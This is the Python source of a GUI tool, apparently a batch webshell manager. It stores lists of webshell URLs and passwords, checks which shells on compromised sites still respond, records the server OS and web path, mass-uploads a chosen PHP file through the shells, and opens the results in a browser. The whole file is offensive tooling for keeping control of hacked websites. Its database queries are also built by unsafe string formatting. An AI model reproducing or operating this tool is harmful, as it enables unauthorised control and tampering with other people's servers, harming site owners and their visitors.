#!/usr/local/bin/python
#-*- coding: UTF-8 -*-

from PyQt4.QtGui import *
import time
import socket
#import webbrowser #访问URL
socket.setdefaulttimeout(10)  #设置了全局默认超时时间
from ctypes import *
import re
#import win32ui
#import tkFileDialog
import webbrowser #访问URL
import sys,os
#import platform
#import tkMessageBox
user32 = windll.LoadLibrary('user32.dll')               # 加载动态链接库
#user32.MessageBoxW(0,c_wchar_p("1111111"), c_wchar_p("QQ:2602159946"), 0)   # 调用MessageBoxA函数
import Csqlite3  #数据库操作
import urllib #转换成网络格式
#import ConfigParser  #INI读取数据
import thread
import random
#import br_pr_sogo #查询
#import baidu_360_sougo_wl_sl #查询_外链收录\n(百度_360_搜狗)
import g  #公用文件
import yijuhua

class   top_1(object):
    def __init__(self,ui,model):
        self.ui=ui
        self.model=model
        #数据库链接
        self.sql3=Csqlite3.C_sqlite3()
        self.sql3.mysqlite3_open()

    #添加数据
    def tableView_add(self,ints,s1=None,s2=None,s3=None,s4=None,s5=None,s6=None,s7=None):  #添加数据
        try:
            #红色：(255,0,0)
            #绿色：(0,255,0)  11
            if s5=="ok":
                s5=None
                self.model.item(ints,4).setBackground(QColor(0,255,0))#//改变背景色
            if s5=="no":
                s5=None
                self.model.item(ints,4).setBackground(QColor(255, 0, 0))#//改变背景色

            if s6=="ok":
                s6=None
                self.model.item(ints,5).setBackground(QColor(0,255,0))#//改变背景色
            if s6=="no":
                s6=None
                self.model.item(ints,5).setBackground(QColor(255, 0, 0))#//改变背景色

            if not s1==None:
                self.model.setItem(ints, 0, QStandardItem(s1))
            if not s2==None:
                self.model.setItem(ints, 1, QStandardItem(s2))
            if not s3==None:
                self.model.setItem(ints, 2, QStandardItem(s3))
            if not s4==None:
                self.model.setItem(ints, 3, QStandardItem(s4))
            if not s5==None:
                self.model.setItem(ints, 4, QStandardItem(s5))
            if not s6==None:
                self.model.setItem(ints, 5, QStandardItem(s6))
            if not s7==None:
                self.model.setItem(ints, 6, QStandardItem(s7))

            if s3=="No" or s3=="null":  #红色  #改变背景色
                self.model.item(ints,0).setBackground(QColor(255, 0, 0))#//改变背景色
                self.model.item(ints,1).setBackground(QColor(255, 0, 0))#//改变背景色
                self.model.item(ints,2).setBackground(QColor(255, 0, 0))#//改变背景色
                self.model.item(ints,3).setBackground(QColor(255, 0, 0))#//改变背景色
                self.model.item(ints,4).setBackground(QColor(255, 0, 0))#//改变背景色
                self.model.item(ints,5).setBackground(QColor(255, 0, 0))#//改变背景色
                self.model.item(ints,6).setBackground(QColor(255, 0, 0))#//改变背景色
                self.model.item(ints,7).setBackground(QColor(255, 0, 0))#//改变背景色
            if s3=="None":
                self.model.item(ints,0).setBackground(QColor(178,178,178))#//改变背景色
                self.model.item(ints,1).setBackground(QColor(178,178,178))#//改变背景色
                self.model.item(ints,2).setBackground(QColor(178,178,178))#//改变背景色
                self.model.item(ints,3).setBackground(QColor(178,178,178))#//改变背景色
                self.model.item(ints,4).setBackground(QColor(178,178,178))#//改变背景色
                self.model.item(ints,5).setBackground(QColor(178,178,178))#//改变背景色
                self.model.item(ints,6).setBackground(QColor(178,178,178))#//改变背景色
                self.model.item(ints,7).setBackground(QColor(178,178,178))#//改变背景色
        except BaseException, e:
            print(str(e))
            #        self.model.setSortRole(0) #排序
            #        self.model.sort(3,Qt.AscendingOrder) #排序  排序只针对INT型
        self.ui.tableView.setModel(self.model)

    def del_tableView(self):  #清空数据
        model = self.ui.tableView.model()
        int_id=self.ui.tableView.model().rowCount()
        for i in range(int_id,-1,-1):
            model.removeRow(i)

    def Button_2(self):  #导入数据
        self.del_tableView()  #清空数据
        dlg = QFileDialog(None)
        self.saveHistoryFilename = dlg.getOpenFileName()
        from os.path import isfile
        if isfile(self.saveHistoryFilename):
            xxx = file(self.saveHistoryFilename, 'r')
            i=0
            for xxx_line in xxx.readlines():
                try:
                    data=xxx_line.strip().lstrip().rstrip('\n')
                    data_time2=time.strftime('%Y-%m-%d %H:%M:%S',time.localtime(time.time()))
                    data_time=time.mktime(time.strptime(data_time2,'%Y-%m-%d %H:%M:%S'))  #转化成时间戳
                    line = data.split("|")
                    if len(line)>=2:
                    #                        print line[0]
                    #                        print line[1]urllib.quote(str(line[0]))
                        sql_data="insert into url(url,passwod,time) VALUES('%s','%s','%s')"%(str(line[0]),str(line[1]),data_time)
                        #print sql_data
                        self.sql3.mysqlite3_insert(sql_data)
                        data2=u"%s"%(line[0])
                        self.tableView_add(i,data2,line[1])  #添加数据
                    else:#urllib.quote(str(data))
                        sql_data="insert into url(url,time) VALUES('%s','%s')"%(str(data),data_time)
                        self.sql3.mysqlite3_insert(sql_data)
                        data2=u"%s"%(data)
                        self.tableView_add(i,data2)  #添加数据
                    i+=1
                except BaseException, e:
                    #print(str(e))
                    pass

    def pushButton(self):  #显示全部数据
        self.del_tableView()  #清空数据
        sql_data = "select * from url order by time DESC"   # asc 表示升序 , desc表示降序
        self.sql3.conn.commit()# 获取到游标对象
        cur = self.sql3.conn.cursor()# 用游标来查询就可以获取到结果
        cur.execute(sql_data)# 获取所有结果
        res = cur.fetchall()  #从结果中取出所有记录
        int_id=0
        for line in res:
            #self.url_data=line[0]
            s0=u"%s"%(urllib.unquote(str(line[0])))
            s3=u"%s"%(urllib.unquote(str(line[4])))
            self.tableView_add(int_id,s0,str(line[1]),str(line[2]),str(line[3]),None,None,s3)  #添加数据
            int_id+=1
        cur.close()  #关闭游标

    def pb_pushButton_9(self):  #删除数据
        int_model = self.ui.tableView.selectionModel()  #获取选中编号
        model = self.ui.tableView.model()#index = model.index(3,1)#data = model.data(index)#print data.toString()
        if len(int_model.selectedRows())==0:
            user32.MessageBoxW(0,c_wchar_p(u"请选择有效内容"), c_wchar_p(u"提示"), 0)   # 调用MessageBoxA函数
            return
        for index in int_model.selectedRows():       #// 对于被选中的每一行
            try:
                int_index=index.row()#获取行号
                s0= model.data(model.index(int_index,0)).toString()
                s1= model.data(model.index(int_index,1)).toString()
                sql_data="delete from url where url='%s' and passwod='%s'"%(str(s0),str(s1))
                self.sql3.mysqlite3_delete(sql_data)
            except BaseException, e:
                print(str(e))
        self.pushButton() #显示状态OK

    def pushButton_2(self): #显示成功webshell
        self.del_tableView()  #清空数据
        sql_data = "select * from url where zt='ok' order by time DESC"   # asc 表示升序 , desc表示降序
        self.sql3.conn.commit()# 获取到游标对象
        cur = self.sql3.conn.cursor()# 用游标来查询就可以获取到结果
        cur.execute(sql_data)# 获取所有结果
        res = cur.fetchall()  #从结果中取出所有记录
        int_id=0
        for line in res:
            #self.url_data=line[0]
            s0=u"%s"%(urllib.unquote(str(line[0])))
            s3=u"%s"%(urllib.unquote(str(line[4])))
            self.tableView_add(int_id,s0,str(line[1]),str(line[2]),str(line[3]),None,None,s3)  #添加数据
            int_id+=1
        cur.close()  #关闭游标

    def pushButton_3(self): #显示失败webshell
        self.del_tableView()  #清空数据
        sql_data = "select * from url where zt is null or zt='No' order by time DESC"   # asc 表示升序 , desc表示降序  #select * from shell where zts3='no' or zts3='None'
        self.sql3.conn.commit()# 获取到游标对象
        cur = self.sql3.conn.cursor()# 用游标来查询就可以获取到结果
        cur.execute(sql_data)# 获取所有结果
        res = cur.fetchall()  #从结果中取出所有记录
        int_id=0
        for line in res:
            #self.url_data=line[0]
            s0=u"%s"%(urllib.unquote(str(line[0])))
            s3=u"%s"%(urllib.unquote(str(line[4])))
            self.tableView_add(int_id,s0,str(line[1]),str(line[2]),str(line[3]),None,None,s3)  #添加数据
            int_id+=1
        cur.close()  #关闭游标

    def pb_pushButton_1(self): #查询\WEBSHELL 状态
        int_model = self.ui.tableView.selectionModel()  #获取选中编号
        if len(int_model.selectedRows())==0:
            user32.MessageBoxW(0,c_wchar_p(u"请选择有效内容"), c_wchar_p(u"提示"), 0)   # 调用MessageBoxA函数
            return
        thread.start_new_thread(self.br_pr_sogo_4,())  #测试一句话是否连接成功

    def br_pr_sogo_4(self):  #查询\WEBSHELL 状态
        self.ui.pb_pushButton_1.setEnabled(0)  #给改成禁用
        int_model = self.ui.tableView.selectionModel()  #获取选中编号
        model = self.ui.tableView.model()#index = model.index(3,1)#data = model.data(index)#print data.toString()
        for index in int_model.selectedRows():       #// 对于被选中的每一行
            try:
                int_index=index.row()#获取行号
                s0= model.data(model.index(int_index,0)).toString()
                s1= model.data(model.index(int_index,1)).toString()
                if s0=="" or len(s0)<=7:
                    self.tableView_add(int_index,None,None,u"null")  #添加数据urllib.quote(str(s0))
                    sql_data="update url set zt='null' where url='%s' and passwod='%s'"%(str(s0),str(s1))
                    self.sql3.mysqlite3_update(sql_data)
                    continue  #跳过
                    #print str(s0)
                if yijuhua.yijuhua_cs(g.bool_asp_php(s0),str(s0),str(s1)):
                    win_linux="WinNT"
                    if g.bool_asp_php(s0)=="php":
                        win_linux=yijuhua.yijuhua_win_linux(str(s0),str(s1))

                    www_wlwz=yijuhua.www_wlwz(str(s0))
                    self.tableView_add(int_index,None,None,u"ok",str(win_linux),None,None,www_wlwz)  #添加数据urllib.quote(str(s0))
                    sql_data="update url set zt='ok',win='%s',wl='%s' where url='%s' and passwod='%s'"%(str(win_linux),urllib.quote(str(www_wlwz)),str(s0),str(s1))
                else:
                    self.tableView_add(int_index,None,None,u"No")  #添加数据urllib.quote(str(s0))
                    sql_data="update url set zt='No' where url='%s' and passwod='%s'"%(str(s0),str(s1))
                    #print sql_data
                self.sql3.mysqlite3_update(sql_data)

            except BaseException, e:
                pass
            #                print(str(e))
            #                self.ui.pushButton_4.setEnabled(1)
            #                return 0
        self.ui.pb_pushButton_1.setEnabled(1)

    def Button_4(self): #选择文件
        try:
            dlg = QFileDialog(None)
            self.saveHistoryFilename = dlg.getOpenFileName()
            from os.path import isfile
            if isfile(self.saveHistoryFilename):
                fname = str(self.saveHistoryFilename) # 获取选择的文件名称
                fname2=u"%s"%(fname)
                self.ui.tx_textEdit_2.setText(fname2)  #转化下防止中文路径
                #获取文件名称 q123.php
                #find正向查找rfind反向查找
                nPos = fname.rfind('/') #查找字符
                I1=len(fname)
                sStr1 = fname[nPos+1:I1] #复制指定长度的字符
                self.ui.tx_textEdit_3.setText(sStr1)  #文件名
                self.ui.tx_textEdit_4.setText(sStr1+"?del=123456")
        except BaseException, e:
            print(str(e))
            return 0
    ##########################################
    def Button_5(self): #上传文件
        int_model = self.ui.tableView.selectionModel()  #获取选中编号
        if len(int_model.selectedRows())==0:
            user32.MessageBoxW(0,c_wchar_p(u"请选择有效内容"), c_wchar_p(u"提示"), 0)   # 调用MessageBoxA函数
            self.ui.messagebox.append(u"=========================")
            self.ui.messagebox.append(u"提示:请选择要上传的URL")
            return

        file_data=self.ui.tx_textEdit_2.toPlainText() #获取路径
        print file_data
        data=""
        try:
            xxx = file(file_data, 'r')
            for xxx_line in xxx.readlines():
                data+=xxx_line+"\r\n"
        except BaseException, e:
            print(str(e))
        if len(data)<=7:
            self.ui.messagebox.append(u"=========================")
            self.ui.messagebox.append(u"%s==文件数据是无效数据"%str(file_data))
            return 0
        file_name=self.ui.tx_textEdit_3.toPlainText() #获取文件名
        data_abc=yijuhua.base64_jm(str(file_name),data)
        self.ui.messagebox.append(u"=========================")
        self.ui.messagebox.append(u"开始批量上传文件")
        self.ui.messagebox.append(u"%d==个地址需要上传"%len(int_model.selectedRows()))
        #多线程参数  abc   传入进去
        thread.start_new_thread(self.yjh_sc_php,(data_abc,file_name,))  #

    def yjh_sc_php(self,data,name):  #通过一句话上传PHP
        int_model = self.ui.tableView.selectionModel()  #获取选中编号
        model = self.ui.tableView.model()#index = model.index(3,1)#data = model.data(index)#print data.toString()
        for index in int_model.selectedRows():       #// 对于被选中的每一行
            try:
                int_index=index.row()#获取行号
                s0= model.data(model.index(int_index,0)).toString()
                s1= model.data(model.index(int_index,1)).toString()
                if s0=="":
                    self.tableView_add(int_index,None,None,None,None,u"地址异常")  #添加数据
                    continue  #跳过
                if len(s0)<=7:
                    self.tableView_add(int_index,None,None,None,None,u"地址异常")  #添加数据
                    continue  #跳过
                if yijuhua.url_post(str(s0),str(s1),data):
                    TX=str(s0).rfind("/") #从尾部查找
                    url=str(s0)[0:TX+1]+name
                    self.tableView_add(int_index,None,None,None,None,url)  #添加数据
                else:
                    self.tableView_add(int_index,None,None,None,None,u"上传文件失败")  #添加数据
            except BaseException, e:
                #print(str(e))
                #return 0
                pass
        self.ui.messagebox.append(u"=========================")
        self.ui.messagebox.append(u"通过一句话上传PHP 完成")

    def Button_6(self): #访问上传文件URL路径
        int_model = self.ui.tableView.selectionModel()  #获取选中编号
        if len(int_model.selectedRows())==0:
            user32.MessageBoxW(0,c_wchar_p(u"请选择有效内容"), c_wchar_p(u"提示"), 0)   # 调用MessageBoxA函数
            self.ui.messagebox.append(u"=========================")
            self.ui.messagebox.append(u"提示:请选择要上传的URL")
            return

        url_time=self.ui.tx_textEdit_1.toPlainText() #获取  延迟
        #        if self.ui.checkBox_3.isChecked():  #隐藏访问
        #            thread.start_new_thread(self.YC_php_fz,(int(url_time),))  #隐藏 访问
        #        else:
        self.ui.messagebox.append(u"=========================")
        self.ui.messagebox.append(u"开始批量访问URL")
        self.ui.messagebox.append(u"%d==个地址需要访问"%len(int_model.selectedRows()))
        thread.start_new_thread(self.zc_fw_url,(int(url_time),))  #正常访问URL

    def show_url(self,url): #正常打开RUL
        try:
            webbrowser.open_new_tab(url)
            return 1
        except BaseException, e:
            print(str(e))
            return 0

    def zc_fw_url(self,tl): #正常访问URL
        int_model = self.ui.tableView.selectionModel()  #获取选中编号
        model = self.ui.tableView.model()#index = model.index(3,1)#data = model.data(index)#print data.toString()
        for index in int_model.selectedRows():       #// 对于被选中的每一行
            try:
                int_index=index.row()#获取行号
                s4= model.data(model.index(int_index,4)).toString()
                if s4=="" or str(s4)==u"上传文件失败" or str(s4)==u"地址异常":
                    self.tableView_add(int_index,None,None,None,None,"no")  #添加数据
                    continue  #跳过
                if len(s4)<=7:
                    self.tableView_add(int_index,None,None,None,None,"no")  #添加数据
                    continue  #跳过

                if ~str(s4).find(":")>1:
                    self.tableView_add(int_index,None,None,None,None,"no")  #添加数据
                    continue  #跳过

                self.tableView_add(int_index,None,None,None,None,"ok")  #添加数据
                self.show_url(str(s4)) #正常打开RUL
                time.sleep(tl)
            except BaseException, e:
#                print(str(e))
#                return 0
                pass
        self.ui.messagebox.append(u"=========================")
        self.ui.messagebox.append(u"访问上传文件URL路径 完成")

    def Button_7(self): #设置URL路径(带参数)
        int_model = self.ui.tableView.selectionModel()  #获取选中编号
        if len(int_model.selectedRows())==0:
            user32.MessageBoxW(0,c_wchar_p(u"请选择有效内容"), c_wchar_p(u"提示"), 0)   # 调用MessageBoxA函数
            self.ui.messagebox.append(u"=========================")
            self.ui.messagebox.append(u"提示:请选择要上传的URL")
            return

        url_time=self.ui.tx_textEdit_4.toPlainText() #获取参数
        if len(url_time)<=3:
            self.ui.messagebox.append(u"=========================")
            self.ui.messagebox.append(u"请重新设置要访问的地址")
            return
        thread.start_new_thread(self.sz_url,(str(url_time),))

    def sz_url(self,name):
        int_model = self.ui.tableView.selectionModel()  #获取选中编号
        model = self.ui.tableView.model()#index = model.index(3,1)#data = model.data(index)#print data.toString()
        for index in int_model.selectedRows():       #// 对于被选中的每一行
            try:
                int_index=index.row()#获取行号
                s0= model.data(model.index(int_index,0)).toString()
                if s0=="":
                    self.tableView_add(int_index,None,None,None,None,None,"no")  #添加数据
                    continue  #跳过
                if len(s0)<=7:
                    self.tableView_add(int_index,None,None,None,None,None,"no")  #添加数据
                    continue  #跳过

                TX=str(s0).rfind("/") #从尾部查找
                url=str(s0)[0:TX+1]+name
                self.tableView_add(int_index,None,None,None,None,None,url)  #添加数据
            except BaseException, e:
#                print(str(e))
#                return 0
                pass
        self.ui.messagebox.append(u"=========================")
        self.ui.messagebox.append(u"访问上传文件URL路径 完成")

    def Button_8(self): #访问URL路径(带参数)
        int_model = self.ui.tableView.selectionModel()  #获取选中编号
        if len(int_model.selectedRows())==0:
            user32.MessageBoxW(0,c_wchar_p(u"请选择有效内容"), c_wchar_p(u"提示"), 0)   # 调用MessageBoxA函数
            self.ui.messagebox.append(u"=========================")
            self.ui.messagebox.append(u"提示:请选择要上传的URL")
            return

        url_time=self.ui.tx_textEdit_1.toPlainText() #获取  延迟
        self.ui.messagebox.append(u"=========================")
        self.ui.messagebox.append(u"开始批量访问URL")
        self.ui.messagebox.append(u"%d==个地址需要访问"%len(int_model.selectedRows()))
        thread.start_new_thread(self.zc_fw_url2,(int(url_time),))  #正常访问URL

    def zc_fw_url2(self,tl): #正常访问URL
        int_model = self.ui.tableView.selectionModel()  #获取选中编号
        model = self.ui.tableView.model()#index = model.index(3,1)#data = model.data(index)#print data.toString()
        for index in int_model.selectedRows():       #// 对于被选中的每一行
            try:
                int_index=index.row()#获取行号
                s4= model.data(model.index(int_index,5)).toString()
                if s4=="":
                    self.tableView_add(int_index,None,None,None,None,None,"no")  #添加数据
                    continue  #跳过
                if len(s4)<=7:
                    self.tableView_add(int_index,None,None,None,None,None,"no")  #添加数据
                    continue  #跳过

                if ~str(s4).find(":")>1:
                    self.tableView_add(int_index,None,None,None,None,None,"no")  #添加数据
                    continue  #跳过

                self.tableView_add(int_index,None,None,None,None,None,"ok")  #添加数据
                self.show_url(str(s4)) #正常打开RUL
                time.sleep(tl)
            except BaseException, e:
#                print(str(e))
#                return 0
                pass
        self.ui.messagebox.append(u"=========================")
        self.ui.messagebox.append(u"访问上传文件URL路径 完成")

    def Button_44(self):  #导出数据
        int_model = self.ui.tableView.selectionModel()  #获取选中编号
        model = self.ui.tableView.model()#index = model.index(3,1)#data = model.data(index)#print data.toString()
        if len(int_model.selectedRows())==0:
            user32.MessageBoxW(0,c_wchar_p(u"请选择有效内容"), c_wchar_p(u"提示"), 0)   # 调用MessageBoxA函数
            return
        data=""
        for index in int_model.selectedRows():       #// 对于被选中的每一行
            try:
                int_index=index.row()#获取行号
                s0= model.data(model.index(int_index,0)).toString()
                s1= model.data(model.index(int_index,1)).toString()
                s2= model.data(model.index(int_index,2)).toString()
                s3= model.data(model.index(int_index,3)).toString()
                data+=s0+u"|"+s1+u"|"+s2+u"|"+s3+u"|"
                data+="\n"
            except BaseException, e:
                print(str(e))
                #        print data
        data_time=time.strftime('%Y-%m-%d',time.localtime(time.time()))
        dlg = QFileDialog(None)
        self.filename = dlg.getSaveFileName(None,u"保存url", u"./"+data_time+u"_url.txt",u"txt (*.txt)")
        #print self.filename
        file_object = open(self.filename, 'w')
        file_object.writelines(data)
        file_object.close()







